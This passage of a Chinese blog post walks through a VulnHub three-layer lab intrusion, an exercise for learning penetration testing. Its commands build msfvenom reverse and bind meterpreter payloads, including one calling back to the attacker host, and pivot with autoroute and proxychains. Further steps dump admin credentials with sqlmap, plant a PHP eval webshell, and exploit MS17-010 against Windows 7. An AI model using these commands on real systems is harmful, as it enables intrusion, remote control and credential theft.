+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>利用蚁剑打开终端，发现另一个IP：191.168.22.128，说明存在其他的内网主机</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="获取主机权限">获取主机权限</h3>
+<p>先用msf创建一个后门，就是在桌面创建一个elf格式的木马，再开启监听，通过刚才蚂剑上传上去，再直接控制终端他的终端运行这个木马即可监听到</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.12.130 <span class="hljs-attribute">lport</span>=6666 -f elf &gt; test.elf<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>图中IP写错了，应该为kali的IP</p>
+<p>将test.elf通过蚁剑上传</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="启动msf">启动msf</h4>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="msf获得权限">msf获得权限</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.12.130(攻击机的IP！)<br><span class="hljs-built_in">set</span> lport 6666<br>run<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>执行“run”或“exploit”之后，在蚁剑中运行刚刚上传的test.elf</p>
+<p>不过第一次运行时提示权限不足，则先对文件赋权</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">777</span> test.elf<br></code></pre></td></tr></table></figure>
+<p>然后可以正常执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./test.elf<br></code></pre></td></tr></table></figure>
+<p>运行后msf拿到彻底拿到CentOS的权限</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/19.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="打穿Ubuntu">打穿Ubuntu</h2>
+<h3 id="信息搜集-2">信息搜集</h3>
+<h4 id="利用nmap扫描另一张网卡的主机">利用nmap扫描另一张网卡的主机</h4>
+<p>首先需要输入命令<code>background</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/21.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>发现很久了都没有扫描结果，这是因为网段设置问题，这里扫描是用的kali的ip扫描，模拟的环境中kali和centos是公网主机，所以可以直接扫到，而现在扫的属于内网网段，所以扫不出结果</p>
+<p>所以需要：用msf自带的<u>探测网络接口的模块（get_local_subnets）</u>和<u>查看路由的模块(autoroute -p)</u>来进一步进行信息探测</p>
+<p>先输入<code>back</code>退出当前session，不要“exit”</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> get_local_subnets<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/22.jpg" srcset="/img/loading.gif" lazyload class="">
+<blockquote>
+<p>分析</p>
+<p>centos处于三个网段内，刚才nmap扫出来只有两个网段，这说明122的网段明显就是出于迷惑的目的，</p>
+<p>而且当前没有路由 （路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程，就相当于把我们要传输的数据先传输到该路由，再发往目标，centos上又没有msf，所以可以通过设置路由的方式把我们的请求从centos发出，这样就可以在kali上访问到centos的ip了）</p>
+<p>所以我们要来添加一个路由(autoroute -s)，因为我们已经在12的网段内，所以添加的路由肯定添加22网段的，就简单理解为我们建立了一个攻击机kali和该网段的隧道</p>
+</blockquote>
+<h3 id="建立网段隧道">建立网段隧道</h3>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> autoroute -s <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span>  # 添加一条道<span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span>的路由<br><span class="hljs-attribute">run</span> autoroute -p  # 查看路由<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/23.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>现在就可以与 22这个网段进行通信了，利用nmap扫描该内网网段下存活了哪些主机（注意：这里使用nmap扫描要禁用ping检测，即-Pn，因为不一定能ping通）</p>
+<p>查看地址解析记录arp -a确定第二层目标为192.168.22.128</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure>
+<h3 id="msf代理设置">msf代理设置</h3>
+<p>这里的路由还有一个缺陷，它只能在这个msf建立的会话上使用，假如新开一个终端使用nmap扫描，还是扫不到</p>
+<p>所以需要msf的代理配置，当然msf有自己的代理模块，就是 auxiliary/server/socks_proxy  ，来开启代理服务，下面是参照博客的设置，srvport是端口随便定，只要不被占用</p>
+<h4 id="使用代理模块auxiliary-server-socks-proxy">使用代理模块auxiliary/server/socks_proxy</h4>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/socks_<br><span class="hljs-keyword">use</span> 0<br><span class="hljs-keyword">set</span> srvport 2222<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">version</span> 4a<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/24.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="修改kali的代理配置">修改kali的代理配置</h4>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vi</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure>
+<p>在该文件的最下面一行，把ip更改为kali攻击机的ip，端口更改为刚刚配置模块的端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks4</span> <span class="hljs-number">192.168.12.130</span> <span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/25.jpg" srcset="/img/loading.gif" lazyload class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/26.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="通过代理执行命令">通过代理执行命令</h4>
+<p>此时在指令前输入proxychains4即可走代理来执行该命令</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -sT -Pn <span class="hljs-number">192.168.22.129</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/27.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="获取Ubuntu的webshell">获取Ubuntu的webshell</h3>
+<h4 id="主机发现">主机发现</h4>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -sn -PR <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<p>比较慢，而且不知道为什么是隔3个IP扫一下</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/28.jpg" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> sudo netdiscover -r <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<p>不知道为什么只有12网段的结果</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<h4 id="端口探测">端口探测</h4>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -sT -Pn <span class="hljs-number">192.168.22.129</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
+<p>上面已有截图</p>
+<p>说是不能直接访问，但是浏览器按照原代理设置仍然可以访问Ubuntu192.168.22.129（参考博客说需要按照右图配置）</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/29.jpg" srcset="/img/loading.gif" lazyload class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/30.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>F12直接提示注入点…</p>
+<p><code>/index.php?r=vul&amp;keyword=1</code></p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/35.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="SQL注入">SQL注入</h4>
+<p><strong>爆破数据库名</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.12.130</span><span class="hljs-function">:2222</span> <span class="hljs-params">--dbs</span><br></code></pre></td></tr></table></figure>
+<p>一些选择</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">you have <span class="hljs-keyword">not</span> declared cookie(s), <span class="hljs-keyword">while</span> <span class="hljs-keyword">server</span> wants <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> its own (<span class="hljs-string">&#x27;PHPSESSID=3kn9melp0fi...7kvvba3u81&#x27;</span>). <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> use those [Y/n] y<br>it looks <span class="hljs-keyword">like</span> the back-<span class="hljs-keyword">end</span> DBMS <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;Oracle&#x27;</span>. <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> skip test payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] n<br><span class="hljs-keyword">for</span> the remaining tests, <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">include</span> <span class="hljs-keyword">all</span> tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;Oracle&#x27;</span> extending provided <span class="hljs-keyword">level</span> (<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> risk (<span class="hljs-number">1</span>) <span class="hljs-keyword">values</span>? [Y/n] y<br><span class="hljs-keyword">GET</span> parameter <span class="hljs-string">&#x27;keyword&#x27;</span> <span class="hljs-keyword">is</span> vulnerable. <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> keep testing the others (<span class="hljs-keyword">if</span> <span class="hljs-keyword">any</span>)? [y/N] n<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/36.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><strong>爆破表</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.12.130</span><span class="hljs-function">:2222</span> -D bagecms <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/37.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><strong>爆破列名</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.12.130</span><span class="hljs-function">:2222</span> -D bagecms -T bage_admin <span class="hljs-params">--columns</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/38.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><strong>爆破字段</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.75.132</span><span class="hljs-function">:2222</span> -D begacms -T bage_admin -C username,password <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/39.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>拿到管理员的用户名和密码：admin；46f94c8de14fb36680850768ff1b7f2a</p>
+<p>通过MD5在线解密得到密码明文：123qwe</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/40.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="以管理员身份登录">以管理员身份登录</h4>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirb http:<span class="hljs-comment">//192.168.22.129</span><br></code></pre></td></tr></table></figure>
+<p>目录扫描发现，有一个robots.txt文件，访问发现里面有管理员相关网站路径</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/41.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>访问，找到登录入口</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/42.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>成功登录，得到第二个flag： flag{eS3sd1IKarw}</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/43.jpg" srcset="/img/loading.gif" lazyload class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/44.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="注入一句话木马">注入一句话木马</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/45.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/46.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>访问：<code>http://192.168.22.129/index.php?r=tag</code></p>
+<p>蚁剑连接，拿到webshell权限</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/47.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/48.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>至此得到了Ubuntu的webshell权限</p>
+<h4 id="获取Ubuntu的主机权限">获取Ubuntu的主机权限</h4>
+<blockquote>
+<p>同理，再生成针对乌班图的木马，这里需要注意的是<strong>木马的shell只能用正向</strong>，因为我们是搭建隧道来访问的乌班图，因为我们正常访问是访问不到的，但是它处于内网中也访问不到我们，而且让他通过隧道来找我们是不现实的，所以还是得我们通过隧道去找他，所以只能正向</p>
+</blockquote>
+<p><strong>生成木马</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/bind_tcp lport=5555 -f elf &gt; test2.elf<br></code></pre></td></tr></table></figure>
+<p>通过蚁剑上传</p>
+<p><strong>msf</strong></p>
+<blockquote>
+<p>同样的msf新开一个页面开启监听，但是这里要注意，msf新开一个页面后之前的那个页面的所有东西都用不了，所以不能直接msfconsole打开，msf这里也需要走代理 ，就是在用proxychains msfconsole来启动msf，再设置payload，设置lport，设置phost，即可开启监听</p>
+</blockquote>
+<p>通过代理启动msf</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/49.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>设置payload、rhost、lport</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp(注意变化)<br><span class="hljs-built_in">set</span> rhost 192.168.22.129(现在是Ubuntu的内网IP)<br><span class="hljs-built_in">set</span> lport 5555<br>run<br></code></pre></td></tr></table></figure>
+<h2 id="打穿win7">打穿win7</h2>
+<h3 id="信息搜集-3">信息搜集</h3>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> get_local_subnets<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/50.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="msf代理配置">msf代理配置</h3>
+<h4 id="配置路由">配置路由</h4>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.33.0/24<br><span class="hljs-built_in">run</span> autoroute -p<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/51.jpg" srcset="/img/loading.gif" lazyload class="">
+<h4 id="开启msf代理模块">开启msf代理模块</h4>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvport 3333<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">version</span> 4a<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+<h4 id="修改配置文件">修改配置文件</h4>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vi</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure>
+<h4 id="获取主机权限-2">获取主机权限</h4>
+<p>设置代理后启动新的msf</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure>
+<p>扫描目标主机window7的端口</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.33.33</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/52.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>开启了445端口，试一下永恒之蓝MS17-010</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOSTS 192.168.33.33<br><span class="hljs-built_in">set</span> LPORT 6666<br>run<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/53.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>成功拿到shell</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/54.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>找到flag：flag{ASf12asf2sd}</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cd</span> config<br><span class="hljs-built_in">dir</span><br><span class="hljs-built_in">more</span> flag.txt<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/55.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>注：flag可能在桌面、C:\Windows\System32\config、任务计划、注册编辑器</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/" class="category-chain-item">vulnhub靶场</a>
+  
+  
+
+      </span>
+    
+  
